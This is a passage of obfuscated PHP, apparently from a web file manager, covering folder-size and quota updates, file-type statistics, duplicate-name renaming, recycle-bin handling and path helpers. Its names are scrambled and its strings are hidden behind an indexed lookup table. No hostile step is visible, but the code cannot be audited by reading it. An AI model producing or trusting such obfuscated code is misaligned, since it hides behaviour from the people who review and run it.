$°áÅ«Æ¦[2196] . $ü‚ğçáÄ; CacheLock::lock($ú§æºÔã, 20); if ($ìäÊ…†Ü === !1) { $this->sourceCacheClear($ü‚ğçáÄ); $Ò£Á¤¶ = $this->sourceInfo($ü‚ğçáÄ); $ƒÚ»¹ö» = array($°áÅ«Æ¦[447] => $ü‚ğçáÄ, $°áÅ«Æ¦[474] => 0); $ĞÀ«òóß = $this->where($ƒÚ»¹ö»)->sum($°áÅ«Æ¦[78]); $ìäÊ…†Ü = intval($ĞÀ«òóß) - intval($Ò£Á¤¶[$°áÅ«Æ¦[78]]); } if ($ìäÊ…†Ü == 0) { return CacheLock::unlock($ú§æºÔã); } $Î‚»³”¢ = $this->parentLevelArray($Ò£Á¤¶[$°áÅ«Æ¦[555]]); if (!$Î‚»³”¢) { $Î‚»³”¢ = array(); } $Î‚»³”¢[] = $Ò£Á¤¶[$°áÅ«Æ¦[183]]; $ƒÚ»¹ö» = array($°áÅ«Æ¦[183] => array($°áÅ«Æ¦[462], $Î‚»³”¢)); if ($ìäÊ…†Ü < 0) { $ƒÚ»¹ö»[$°áÅ«Æ¦[78]] = array($°áÅ«Æ¦[1050], abs($ìäÊ…†Ü)); } $this->where($ƒÚ»¹ö»)->setAdd($°áÅ«Æ¦[78], $ìäÊ…†Ü); CacheLock::unlock($ú§æºÔã); $Ğü®Ê‡ = $°áÅ«Æ¦[2197] . $Ò£Á¤¶[$°áÅ«Æ¦[180]] . $°áÅ«Æ¦[4] . $Ò£Á¤¶[$°áÅ«Æ¦[540]]; $©‘Æ‘÷‚ = array($Ò£Á¤¶[$°áÅ«Æ¦[180]], $Ò£Á¤¶[$°áÅ«Æ¦[540]]); TaskRun::timeLimitCall($Ğü®Ê‡, $°áÅ«Æ¦[2198], $©‘Æ‘÷‚, 1.5); } public function folderSizeResetChildren($ë†Êàîº) { $ÈÎÅ²¾ƒ =& $_SERVER[ ÇƒŠìÀ]; $this->sourceCacheClear($ë†Êàîº); $‹Úäåö = $this->sourceInfo($ë†Êàîº); $‚ö£ = array($ÈÎÅ²¾ƒ[616] => 1, $ÈÎÅ²¾ƒ[619] => $‹Úäåö[$ÈÎÅ²¾ƒ[540]], $ÈÎÅ²¾ƒ[622] => array($ÈÎÅ²¾ƒ[582], $‹Úäåö[$ÈÎÅ²¾ƒ[555]] . $ë†Êàîº . $ÈÎÅ²¾ƒ[583])); $‡ğ²³–Ñ = $ÈÎÅ²¾ƒ[2199]; $Î÷ÚÊîç = $this->field($‡ğ²³–Ñ)->where($‚ö£)->select(); $‚ö£[$ÈÎÅ²¾ƒ[455]] = 0; $›‚æÎ‡ = $this->field($‡ğ²³–Ñ)->where($‚ö£)->select(); if (!$›‚æÎ‡) { return; } $Î÷ÚÊîç[] = $‹Úäåö; $Î÷ÚÊîç = array_to_keyvalue($Î÷ÚÊîç, $ÈÎÅ²¾ƒ[183]); foreach ($Î÷ÚÊîç as $óóÍäã« => $ªÕ¾‰¤ê) { $Î÷ÚÊîç[$óóÍäã«][$ÈÎÅ²¾ƒ[2200]] = $Î÷ÚÊîç[$óóÍäã«][$ÈÎÅ²¾ƒ[78]]; $Î÷ÚÊîç[$óóÍäã«][$ÈÎÅ²¾ƒ[78]] = 0; } foreach ($›‚æÎ‡ as $ªÕ¾‰¤ê) { $‘å‘øÀ = $ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[182]] . $ÈÎÅ²¾ƒ[12]; if (!isset($Î÷ÚÊîç[$‘å‘øÀ])) { continue; } if ($ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[475]] == $Î÷ÚÊîç[$‘å‘øÀ][$ÈÎÅ²¾ƒ[475]]) { $Î÷ÚÊîç[$‘å‘øÀ][$ÈÎÅ²¾ƒ[78]] += $ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[78]]; } } foreach ($Î÷ÚÊîç as $ªÕ¾‰¤ê) { $íäĞ©÷µ = $this->parentLevelArray($ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[555]]); foreach ($íäĞ©÷µ as $‘å‘øÀ) { $‘å‘øÀ = $‘å‘øÀ . $ÈÎÅ²¾ƒ[12]; if (!isset($Î÷ÚÊîç[$‘å‘øÀ])) { continue; } if ($ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[475]] == $Î÷ÚÊîç[$‘å‘øÀ][$ÈÎÅ²¾ƒ[475]]) { $Î÷ÚÊîç[$‘å‘øÀ][$ÈÎÅ²¾ƒ[78]] += $ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[78]]; } } } $Ä±ÙáÅğ = array(); foreach ($Î÷ÚÊîç as $ªÕ¾‰¤ê) { if ($ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[78]] == $ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[2200]]) { continue; } $Ä±ÙáÅğ[] = array($ÈÎÅ²¾ƒ[183], $ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[183]], $ÈÎÅ²¾ƒ[78], $ªÕ¾‰¤ê[$ÈÎÅ²¾ƒ[78]]); } $this->saveAll($Ä±ÙáÅğ); } public function userSpaceReset($„©‹€õÔ = false) { $×°“–‚¢ =& $_SERVER[ ÇƒŠìÀ]; $ÛÙíÈÉ† = $this->where(array($×°“–‚¢[180] => self::TYPE_USER, $×°“–‚¢[540] => $„©‹€õÔ, $×°“–‚¢[455] => 0))->sum($×°“–‚¢[78]); $ÛÙíÈÉ† = !$ÛÙíÈÉ† || $ÛÙíÈÉ† <= 0 ? 0 : $ÛÙíÈÉ†; Model($×°“–‚¢[548])->userEdit($„©‹€õÔ, array($×°“–‚¢[1876] => $ÛÙíÈÉ†)); } public function targetSpaceUpdate($şÔè·“, $ˆÌ¡Œ„ğ) { $é³ÓıÙ‹ =& $_SERVER[ ÇƒŠìÀ]; if (!$ˆÌ¡Œ„ğ) { return; } if (!in_array($şÔè·“, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¨æ°ØÄ = $this->targetSpaceSize($şÔè·“, $ˆÌ¡Œ„ğ); if ($şÔè·“ == self::TYPE_USER) { Model($é³ÓıÙ‹[548])->userEdit($ˆÌ¡Œ„ğ, array($é³ÓıÙ‹[1876] => $¨æ°ØÄ)); } else { if ($şÔè·“ == self::TYPE_GROUP) { Model($é³ÓıÙ‹[556])->groupEdit($ˆÌ¡Œ„ğ, array($é³ÓıÙ‹[1876] => $¨æ°ØÄ)); } } } public function targetSpaceSize($ûŸ†Ïî—, $©¯ùÉ ‹) { $ƒ»†Ú¿ =& $_SERVER[ ÇƒŠìÀ]; $ïÖÜÇèä = 0; $úÍÊ­™ô = $this->targetSourceRoot($ûŸ†Ïî—, $©¯ùÉ ‹, !0); foreach ($úÍÊ­™ô as $’ê¢¨) { if (!$’ê¢¨) { continue; } $ïÖÜÇèä += floatval($’ê¢¨[$ƒ»†Ú¿[78]]); $¦†°¸‰ò = array($ƒ»†Ú¿[622] => array($ƒ»†Ú¿[582], $ƒ»†Ú¿[565] . $’ê¢¨[$ƒ»†Ú¿[183]] . $ƒ»†Ú¿[583])); $ÀØë¸ŠÍ = Model($ƒ»†Ú¿[473])->field($ƒ»†Ú¿[461])->where($¦†°¸‰ò)->select(); $ÀØë¸ŠÍ = array_to_keyvalue($ÀØë¸ŠÍ, $ƒ»†Ú¿[12], $ƒ»†Ú¿[183]); $ÀØë¸ŠÍ = array_unique(array_filter($ÀØë¸ŠÍ)); if ($ÀØë¸ŠÍ) { $¦†°¸‰ò = array($ƒ»†Ú¿[461] => array($ƒ»†Ú¿[462], $ÀØë¸ŠÍ)); $ïÖÜÇèä += floatval($this->where($¦†°¸‰ò)->sum($ƒ»†Ú¿[78])); } } $ïÖÜÇèä = !$ïÖÜÇèä || $ïÖÜÇèä <= 0 ? 0 : $ïÖÜÇèä; return $ïÖÜÇèä; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($äíÖÒÕ«) { return $this->fileTypeProfile($äíÖÒÕ«, SourceModel::TYPE_USER); } public function groupFileTypeProfile($È²çŸıü) { return $this->fileTypeProfile($È²çŸıü, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¸ÈÃ‘Œ, $à™ı›µÖ) { $Ä¥ï©§ì =& $_SERVER[ ÇƒŠìÀ]; $àçñáŞ£ = $Ä¥ï©§ì[2201] . $¸ÈÃ‘Œ . $Ä¥ï©§ì[11] . $à™ı›µÖ; $¬Ù¿âÊ÷ = Cache::get($àçñáŞ£); if ($¬Ù¿âÊ÷) { return $¬Ù¿âÊ÷; } $Ù»±ƒîñ = array($Ä¥ï©§ì[616] => 0); if ($¸ÈÃ‘Œ != !1) { $Ù»±ƒîñ[$Ä¥ï©§ì[540]] = $¸ÈÃ‘Œ; $Ù»±ƒîñ[$Ä¥ï©§ì[180]] = $à™ı›µÖ; } $ûâø•ø— = array(); $ûâø•ø—[$Ä¥ï©§ì[2202]] = array($Ä¥ï©§ì[2203] => LNG($Ä¥ï©§ì[2202]), $Ä¥ï©§ì[2204] => $this->where($Ù»±ƒîñ)->count(), $Ä¥ï©§ì[587] => $this->where($Ù»±ƒîñ)->sum($Ä¥ï©§ì[78])); $Œ½‰¶›è = KodIO::fileTypeList(); foreach ($Œ½‰¶›è as $°›Çşã => $Í×şª†Ü) { $Ù»±ƒîñ[$Ä¥ï©§ì[456]] = $this->fileTypeWhere($°›Çşã); $ûâø•ø—[$°›Çşã] = array($Ä¥ï©§ì[2203] => $Í×şª†Ü[$Ä¥ï©§ì[32]], $Ä¥ï©§ì[2204] => $this->where($Ù»±ƒîñ)->count(), $Ä¥ï©§ì[587] => $this->where($Ù»±ƒîñ)->sum($Ä¥ï©§ì[78])); } Cache::set($àçñáŞ£, $ûâø•ø—, 1200); return $ûâø•ø—; } public function fileNameExist($î¬Êû†¤, $Ñ·‚õµí) { $Ç¶õúìÂ =& $_SERVER[ ÇƒŠìÀ]; $›‹¾’’ï = $this->field($Ç¶õúìÂ[2205])->where(array($Ç¶õúìÂ[182] => $î¬Êû†¤, $Ç¶õúìÂ[32] => $Ñ·‚õµí, $Ç¶õúìÂ[475] => 0))->find(); return is_array($›‹¾’’ï) ? $›‹¾’’ï[$Ç¶õúìÂ[183]] : !1; } public function childList($‡íŸ¥“) { $„ŸÌ¢ª =& $_SERVER[ ÇƒŠìÀ]; $ªé½´öı = $„ŸÌ¢ª[2176] . $‡íŸ¥“; if (isset(self::$cacheChildList[$ªé½´öı])) { return self::$cacheChildList[$ªé½´öı]; } $Ë™é¸ş = array($„ŸÌ¢ª[182] => intval($‡íŸ¥“), $„ŸÌ¢ª[475] => 0); $Õ¤•Îş = $this->where($Ë™é¸ş)->select(); $Õ¤•Îş = $Õ¤•Îş ? $Õ¤•Îş : array(); self::$cacheChildList[$ªé½´öı] = $Õ¤•Îş; foreach ($Õ¤•Îş as $Ê¨Ÿâ‹) { $ªé½´öı = $„ŸÌ¢ª[503] . $Ê¨Ÿâ‹[$„ŸÌ¢ª[183]]; self::$cacheSourceInfo[$ªé½´öı] = $Ê¨Ÿâ‹; } return $Õ¤•Îş; } public function fileNameAuto($–°Ã”º², $‡ªß”¥à, $‡¥±ò³Ü = REPEAT_RENAME, $á®îç€‹ = false) { $‚ûÑÏ®Ø =& $_SERVER[ ÇƒŠìÀ]; $ÁÏ‹¿Ä¼ = get_path_ext($‡ªß”¥à); $ä˜ÕëÉ­ = $ÁÏ‹¿Ä¼ ? basename($‡ªß”¥à, $‚ûÑÏ®Ø[10] . $ÁÏ‹¿Ä¼) . $‚ûÑÏ®Ø[2206] . $ÁÏ‹¿Ä¼ : $‡ªß”¥à . $‚ûÑÏ®Ø[430]; $„ÊÕ…ùì = array($‚ûÑÏ®Ø[182] => $–°Ã”º², $‚ûÑÏ®Ø[475] => 0, $‚ûÑÏ®Ø[32] => array($‚ûÑÏ®Ø[429], $ä˜ÕëÉ­)); $ğË¨š‚¶ = $this->field($‚ûÑÏ®Ø[32])->where($„ÊÕ…ùì)->select(); $ı¤‰»º = array_to_keyvalue($ğË¨š‚¶, $‚ûÑÏ®Ø[12], $‚ûÑÏ®Ø[32]); return $this->fileNameAutoGet($ı¤‰»º, $‡ªß”¥à, $‡¥±ò³Ü, $á®îç€‹); } public function fileNameAutoGet($Á‘¡¤‹…, $„Ÿ®—Óø, $òÃ‚ÖÓÃ, $¼ÃŠ†­ò) { $ç”àæº± =& $_SERVER[ ÇƒŠìÀ]; if ($òÃ‚ÖÓÃ == REPEAT_REPLACE || !$Á‘¡¤‹… || !in_array_not_case($„Ÿ®—Óø, $Á‘¡¤‹…) || $¼ÃŠ†­ò && $òÃ‚ÖÓÃ != REPEAT_RENAME_FOLDER) { return $„Ÿ®—Óø; } if ($òÃ‚ÖÓÃ == REPEAT_SKIP) { return !1; } $¹õŒÀ¬õ = $ç”àæº±[10] . get_path_ext($„Ÿ®—Óø); $¹õŒÀ¬õ = $¹õŒÀ¬õ == $ç”àæº±[10] || $¼ÃŠ†­ò ? $ç”àæº±[12] : $¹õŒÀ¬õ; for ($¾Ãâ•óò = 1; $¾Ãâ•óò <= count($Á‘¡¤‹…) + 1; $¾Ãâ•óò++) { $çÀ”äÑ = substr($„Ÿ®—Óø, 0, strlen($„Ÿ®—Óø) - strlen($¹õŒÀ¬õ)); $„â¶İª = $çÀ”äÑ . "\x28{$¾Ãâ•óò}\x29{$¹õŒÀ¬õ}"; if (!in_array_not_case($„â¶İª, $Á‘¡¤‹…)) { return $„â¶İª; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\143\145\x5f\162\x65\143\x79\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\x69\x6d\145", "\x74\151\155\x65", "\151\x6e\163\x65\x72\x74", "\146\x75\156\143\x74\151\x6f\x6e")); public function listData($ËÆçÌ‡‡ = false) { $ªş”’¾ =& $_SERVER[ ÇƒŠìÀ]; $ËÆçÌ‡‡ = $ËÆçÌ‡‡ ? $ËÆçÌ‡‡ : USER_ID; $ïì§‡‘• = $this->where(array($ªş”’¾[1680] => $ËÆçÌ‡‡))->select(); return array_to_keyvalue($ïì§‡‘•, $ªş”’¾[12], $ªş”’¾[183]); } public function moveToRecycle($ııª‚Ø) { $‘·Æ‹à÷ =& $_SERVER[ ÇƒŠìÀ]; $Û†Ã“ıâ = Model($‘·Æ‹à÷[1368]); $ŒûŠâ…ë = $Û†Ã“ıâ->sourceInfo($ııª‚Ø); if (!$ŒûŠâ…ë || $ŒûŠâ…ë[$‘·Æ‹à÷[475]] == $‘·Æ‹à÷[90]) { return; } $¹ÃÅË—ú = array($‘·Æ‹à÷[461] => $ııª‚Ø, $‘·Æ‹à÷[1680] => USER_ID, $‘·Æ‹à÷[618] => $ŒûŠâ…ë[$‘·Æ‹à÷[180]], $‘·Æ‹à÷[619] => $ŒûŠâ…ë[$‘·Æ‹à÷[540]], $‘·Æ‹à÷[622] => $ŒûŠâ…ë[$‘·Æ‹à÷[555]]); $this->add($¹ÃÅË—ú); $this->recycleMove($ııª‚Ø, 1); if ($ŒûŠâ…ë[$‘·Æ‹à÷[455]] == $‘·Æ‹à÷[90]) { $£š¢ç® = array($‘·Æ‹à÷[622] => array($‘·Æ‹à÷[582], $ŒûŠâ…ë[$‘·Æ‹à÷[555]] . $ııª‚Ø . $‘·Æ‹à÷[583])); $Û†Ã“ıâ->where($£š¢ç®)->setField($‘·Æ‹à÷[475], 1); } } public function clear() { $this->remove(!1); } public function remove($¯şïÓÆ² = false, $·µíšï• = false) { $ÊíË‹°¨ =& $_SERVER[ ÇƒŠìÀ]; $·µíšï• = $·µíšï• ? $·µíšï• : USER_ID; $¤Í“£ = Model($ÊíË‹°¨[1368]); $Ü¶ÙÁ = $this->listData($·µíšï•); $¯şïÓÆ² = $¯şïÓÆ² === !1 ? !1 : $¯şïÓÆ²; $ñ”ì³¸¢ = array(); foreach ($Ü¶ÙÁ as $Œà¡Ñ‹) { if ($¯şïÓÆ² != !1 && !in_array($Œà¡Ñ‹, $¯şïÓÆ²)) { continue; } $¾¯ŸíÀÅ = $¤Í“£->sourceInfo($Œà¡Ñ‹); $¤Í“£->remove($Œà¡Ñ‹, !1); $Ÿ©ÎªÌ = $¾¯ŸíÀÅ[$ÊíË‹°¨[180]] . $ÊíË‹°¨[11] . $¾¯ŸíÀÅ[$ÊíË‹°¨[540]]; $ñ”ì³¸¢[$Ÿ©ÎªÌ] = array($ÊíË‹°¨[618] => $¾¯ŸíÀÅ[$ÊíË‹°¨[180]], $ÊíË‹°¨[540] => $¾¯ŸíÀÅ[$ÊíË‹°¨[540]]); $this->where(array($ÊíË‹°¨[183] => $Œà¡Ñ‹))->delete(); } foreach ($ñ”ì³¸¢ as $­ˆ³•¥à) { $¤Í“£->targetSpaceUpdate($­ˆ³•¥à[$ÊíË‹°¨[180]], $­ˆ³•¥à[$ÊíË‹°¨[540]]); } } public function restore($İù†Îòú = false) { $¸ä”¥Ê = $this->listData(); $this->_restoreSource($¸ä”¥Ê, $İù†Îòú); } public function removeUserAll($Ó’Ğ®„) { $this->remove(!1, $Ó’Ğ®„); } public function restoreItem($ ŒÅÌÕê) { $this->_restoreSource(array($ ŒÅÌÕê), array($ ŒÅÌÕê)); } private function _restoreSource($ãÛâŸ¯ú, $İ©¦üˆ¾) { $â¼»Øİİ =& $_SERVER[ ÇƒŠìÀ]; $¤Ù¯ßíÄ = Model($â¼»Øİİ[1368]); $İ©¦üˆ¾ = $İ©¦üˆ¾ == !1 ? !1 : $İ©¦üˆ¾; if (!$ãÛâŸ¯ú) { return !0; } $¼õÕìå„ = array(); foreach ($ãÛâŸ¯ú as $Óìé«ü) { if ($İ©¦üˆ¾ != !1 && !in_array($Óìé«ü, $İ©¦üˆ¾)) { continue; } $ëÖ·øŒƒ = $¤Ù¯ßíÄ->sourceInfo($Óìé«ü); $¦ÏÍ­”ã = $¤Ù¯ßíÄ->sourceInfo($ëÖ·øŒƒ[$â¼»Øİİ[182]]); if ($¦ÏÍ­”ã[$â¼»Øİİ[475]] == $â¼»Øİİ[90]) { continue; } $¤Ù¯ßíÄ->lockMoveStart($Óìé«ü); $this->recycleMove($Óìé«ü, 0); if ($ëÖ·øŒƒ[$â¼»Øİİ[455]] == $â¼»Øİİ[90]) { $Ÿ£Ä£· = array($â¼»Øİİ[622] => array($â¼»Øİİ[582], $ëÖ·øŒƒ[$â¼»Øİİ[555]] . $Óìé«ü . $â¼»Øİİ[583])); $¤Ù¯ßíÄ->where($Ÿ£Ä£·)->setField($â¼»Øİİ[475], 0); $this->restoreFolderChildren($Óìé«ü, $ãÛâŸ¯ú); } $this->where(array($â¼»Øİİ[183] => $Óìé«ü))->delete(); $¤Ù¯ßíÄ->folderSizeReset($ëÖ·øŒƒ[$â¼»Øİİ[182]]); $¼õÕìå„[] = $ëÖ·øŒƒ[$â¼»Øİİ[182]]; if ($ëÖ·øŒƒ[$â¼»Øİİ[455]] == $â¼»Øİİ[90]) { $¼õÕìå„[] = $Óìé«ü; } $¤Ù¯ßíÄ->lockMoveEnd($Óìé«ü); } $¤Ù¯ßíÄ->updateModifyTime($¼õÕìå„); } private function restoreFolderChildren($¹ÂĞ‚…ó, $¾³©Ü™) { $æøöáª­ =& $_SERVER[ ÇƒŠìÀ]; $œ”ó öû = Model($æøöáª­[1368]); $Êù÷ŸÎ¹ = array($æøöáª­[183] => array($æøöáª­[7], array())); foreach ($¾³©Ü™ as $¥¶ò€©İ) { if ($¥¶ò€©İ == $¹ÂĞ‚…ó) { continue; } if (!$œ”ó öû->isParentOf($¹ÂĞ‚…ó, $¥¶ò€©İ)) { continue; } $ªÑûüï· = $œ”ó öû->sourceInfo($¥¶ò€©İ); if ($ªÑûüï·[$æøöáª­[455]] == $æøöáª­[90]) { $Êù÷ŸÎ¹[] = array($æøöáª­[622] => array($æøöáª­[582], $ªÑûüï·[$æøöáª­[555]] . $¥¶ò€©İ . $æøöáª­[583])); } else { $Êù÷ŸÎ¹[$æøöáª­[183]][1][] = $¥¶ò€©İ; } } if (!$Êù÷ŸÎ¹[$æøöáª­[183]][1]) { unset($Êù÷ŸÎ¹[$æøöáª­[183]]); } if (!$Êù÷ŸÎ¹) { return; } if (is_array($Êù÷ŸÎ¹[$æøöáª­[183]]) && is_array($Êù÷ŸÎ¹[$æøöáª­[183]][1])) { $Êù÷ŸÎ¹[$æøöáª­[183]][1] = array_unique($Êù÷ŸÎ¹[$æøöáª­[183]][1]); } $Êù÷ŸÎ¹[$æøöáª­[1035]] = $æøöáª­[1985]; $œ”ó öû->where($Êù÷ŸÎ¹)->setField($æøöáª­[475], 1); } private function recycleMove($Ìç¤ÊÔ, $Ç¥ÍÃÇÆ = 1) { $íşÒıš€ =& $_SERVER[ ÇƒŠìÀ]; $Á —Äß± = Model($íşÒıš€[1368]); $ÄÎ·Âƒ® = Model($íşÒıš€[2207]); $ùï¸Ç = array($íşÒıš€[183] => $Ìç¤ÊÔ); if ($Ç¥ÍÃÇÆ) { $Á —Äß±->where($ùï¸Ç)->setField($íşÒıš€[475], 1); $ÄÎ·Âƒ®->eventRecycle($Ìç¤ÊÔ, $íşÒıš€[2208]); } else { $äóùïÓÏ = $Á —Äß±->where($ùï¸Ç)->find(); $¼ƒ‹ßøÀ = $äóùïÓÏ[$íşÒıš€[455]] == $íşÒıš€[90]; $ÛÔùÂ„ = $Á —Äß±->fileNameAuto($äóùïÓÏ[$íşÒıš€[182]], $äóùïÓÏ[$íşÒıš€[32]], REPEAT_RENAME_FOLDER, $¼ƒ‹ßøÀ); if ($ÛÔùÂ„ != $äóùïÓÏ[$íşÒıš€[32]]) { $Á —Äß±->rename($Ìç¤ÊÔ, $ÛÔùÂ„); } $Á —Äß±->where($ùï¸Ç)->setField($íşÒıš€[475], 0); $ÄÎ·Âƒ®->eventRecycle($Ìç¤ÊÔ, $íşÒıš€[2209]); } } } goto c¯É‡ÇŸÍ…; cÆ®ê„õ©: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Í‰¾¯Ëö =& $_SERVER[ ÇƒŠìÀ]; $this->objectDriver = array($Í‰¾¯Ëö[60], $Í‰¾¯Ëö[61], $Í‰¾¯Ëö[62], $Í‰¾¯Ëö[63], $Í‰¾¯Ëö[64], $Í‰¾¯Ëö[65], $Í‰¾¯Ëö[66], $Í‰¾¯Ëö[67], $Í‰¾¯Ëö[68], $Í‰¾¯Ëö[69], $Í‰¾¯Ëö[70]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($÷ Ó—éĞ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($÷ Ó—éĞ, $_SERVER[ ÇƒŠìÀ][8]); } return $÷ Ó—éĞ; } public function iconvApp($À°ÉåÀë) { return $À°ÉåÀë; } public function iconvSystem($Î‚ØÚ¸ï) { return $Î‚ØÚ¸ï; } public function iconvTo($ıĞ°”ÎÍ, $·„ºÖÌ, $äµÙçªÁ) { $¦§ÜÂñò =& $_SERVER[ ÇƒŠìÀ]; if (!$ıĞ°”ÎÍ || !function_exists($¦§ÜÂñò[71])) { return $ıĞ°”ÎÍ; } static $±¶ÚÀ—‚ = array(); $›ê±©ÆŞ = $·„ºÖÌ . $¦§ÜÂñò[72] . $äµÙçªÁ . $¦§ÜÂñò[73] . $ıĞ°”ÎÍ; if (isset($±¶ÚÀ—‚[$›ê±©ÆŞ])) { return $±¶ÚÀ—‚[$›ê±©ÆŞ]; } if (function_exists($¦§ÜÂñò[74])) { $àÈ†¥´ = @mb_convert_encoding($ıĞ°”ÎÍ, $äµÙçªÁ, $·„ºÖÌ); } else { $àÈ†¥´ = @iconv($·„ºÖÌ, $äµÙçªÁ, $ıĞ°”ÎÍ); } $àÈ†¥´ = $àÈ†¥´ ? $àÈ†¥´ : $ıĞ°”ÎÍ; if (strstr($àÈ†¥´, $¦§ÜÂñò[75])) { $àÈ†¥´ = str_replace($¦§ÜÂñò[75], $¦§ÜÂñò[11], $àÈ†¥´); } $±¶ÚÀ—‚[$·„ºÖÌ . $¦§ÜÂñò[72] . $äµÙçªÁ . $¦§ÜÂñò[73] . $ıĞ°”ÎÍ] = $àÈ†¥´; $±¶ÚÀ—‚[$äµÙçªÁ . $¦§ÜÂñò[72] . $·„ºÖÌ . $¦§ÜÂñò[73] . $ıĞ°”ÎÍ] = $ıĞ°”ÎÍ; $±¶ÚÀ—‚[$äµÙçªÁ . $¦§ÜÂñò[72] . $·„ºÖÌ . $¦§ÜÂñò[73] . $àÈ†¥´] = $ıĞ°”ÎÍ; $±¶ÚÀ—‚[$·„ºÖÌ . $¦§ÜÂñò[72] . $äµÙçªÁ . $¦§ÜÂñò[73] . $àÈ†¥´] = $àÈ†¥´; return $àÈ†¥´; } public function getPathInner($à˜‹Œ¿®) { $¹ı–Ó¦‚ = IO::init($à˜‹Œ¿®); return $¹ı–Ó¦‚->path; } public function getPathOuter($”¦ë¸) { $âÅñ£ï‚ =& $_SERVER[ ÇƒŠìÀ]; $”óÖ¥ŸŠ = strlen(trim($this->pathBase, $âÅñ£ï‚[8])); $”¦ë¸ = substr(trim($”¦ë¸, $âÅñ£ï‚[8]), $”óÖ¥ŸŠ); return $this->pathDriver . $âÅñ£ï‚[8] . ltrim($”¦ë¸, $âÅñ£ï‚[8]); } public function isParentOf($´ùŸøˆÇ, $Œ«Åâ°Ú) { $­¡Ó°Å¯ =& $_SERVER[ ÇƒŠìÀ]; $´ùŸøˆÇ = rtrim(strtolower($´ùŸøˆÇ), $­¡Ó°Å¯[8]) . $­¡Ó°Å¯[8]; $Œ«Åâ°Ú = rtrim(strtolower($Œ«Åâ°Ú), $­¡Ó°Å¯[8]) . $­¡Ó°Å¯[8]; $‰ßË§ùµ = strpos($Œ«Åâ°Ú, $´ùŸøˆÇ) === 0; return $‰ßË§ùµ; } public function getType() { $’û«öÂ =& $_SERVER[ ÇƒŠìÀ]; $ É¿¯ÁË = str_replace($’û«öÂ[76], $’û«öÂ[12], get_class($this)); return strtolower($ É¿¯ÁË); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($´‹©àÄ, $Ñ‹ºÁÀî) { $íá¾ÉòÁ =& $_SERVER[ ÇƒŠìÀ]; $ıáÕõò¨ = rtrim($´‹©àÄ, $íá¾ÉòÁ[8]) . $íá¾ÉòÁ[8] . $Ñ‹ºÁÀî; $ŒŞ¼®ªú = $this->exist($ıáÕõò¨); return $ŒŞ¼®ªú ? $ıáÕõò¨ : !1; } public function setModifyTime($‘Ÿœ¦Ö, $ì‹åØÁª = '') { } public function renameObject($öˆ¯À°ï, $÷·ˆ“ã‹) { $ëÜôí = $÷·ˆ“ã‹; $öˆ¯À°ï = $this->getPathOuter($öˆ¯À°ï); $÷·ˆ“ã‹ = $this->pathFather($öˆ¯À°ï) . $÷·ˆ“ã‹; $Ë²ÜÀÃ = IO::copy($öˆ¯À°ï, $this->pathFather($öˆ¯À°ï), REPEAT_RENAME_FOLDER, $ëÜôí); if ($Ë²ÜÀÃ) { IO::remove($öˆ¯À°ï); } return $Ë²ÜÀÃ ? $÷·ˆ“ã‹ : !1; } public function tempFile($–á™œŠï = '', $ƒ×Êõ¬ = '') { if (!$–á™œŠï) { $–á™œŠï = rand_string(15); } $³­ßÑ‡¸ = TEMP_FILES . rand_string(15) . $_SERVER[ ÇƒŠìÀ][8]; @mkdir($³­ßÑ‡¸, DEFAULT_PERRMISSIONS, !0); $ “İú¡ = $³­ßÑ‡¸ . $–á™œŠï; @touch($ “İú¡); if ($ƒ×Êõ¬) { file_put_contents($ “İú¡, $ƒ×Êõ¬); } return $ “İú¡; } public function tempFileRemve($œ‡Úô¾ó) { @unlink($œ‡Úô¾ó); @rmdir($this->pathFather($œ‡Úô¾ó)); } public function mkfile($™‹“Ä‡Ó, $­Œ³›Î÷ = '', $ÕÌ®ŒÏ¾ = REPEAT_RENAME) { } public function mkdir($¯Çë€š£, $¹¸ëÊ£— = REPEAT_SKIP) { } public function delFile($ÓÑğñ°Î) { } public function delFolder($Úù“ÚÖ) { } public function copyFile($à„øµ³Ç, $ÉÂ…¬ÁÇ) { } public function moveFile($ìîõıÅ“, $Ô“Ÿâ†ì) { } public function remove($œ£ñÆ¸ô) { if ($this->isFile($œ£ñÆ¸ô)) { return $this->delFile($œ£ñÆ¸ô); } return $this->delFolder($œ£ñÆ¸ô); } public function rename($ğéµÙÊÇ, $Ôî¾ÂÓ) { } public function exist($Á´¹ÓÒ) { } public function findByHash($µçÚÊ˜ = '', $í°ş±“¢ = '') { return !1; } public function isFile($øÚëÈ¶û) { } public function isFolder($ŠşÔÅ”) { } public function size($ˆË÷ŠÃô) { } public function info($ôëË§ì“) { } public function infoSimple($óò§ı©·) { return $this->info($óò§ı©·); } public function infoAuth($©ÈõâüÇ) { return $this->info($©ÈõâüÇ); } public function infoFull($†Òë›ä) { return $this->info($†Òë›ä); } public function infoFullSimple($ß¬õåÀÛ) { return $this->info($ß¬õåÀÛ); } public function infoWithChildren($èÇ¥õø) { $£öÊÆ¥á =& $_SERVER[ ÇƒŠìÀ]; static $ğĞ»ş“ = array(); if (isset($ğĞ»ş“[$èÇ¥õø])) { return $ğĞ»ş“[$èÇ¥õø]; } $Éè‡—È¼ = $this->info($èÇ¥õø); if ($Éè‡—È¼ && $Éè‡—È¼[$£öÊÆ¥á[33]] == $£öÊÆ¥á[77]) { $ûŸï’Üå = array($£öÊÆ¥á[78] => 0, $£öÊÆ¥á[79] => 0, $£öÊÆ¥á[80] => 0); $this->infoChildren($èÇ¥õø, $ûŸï’Üå); $Éè‡—È¼[$£öÊÆ¥á[78]] = 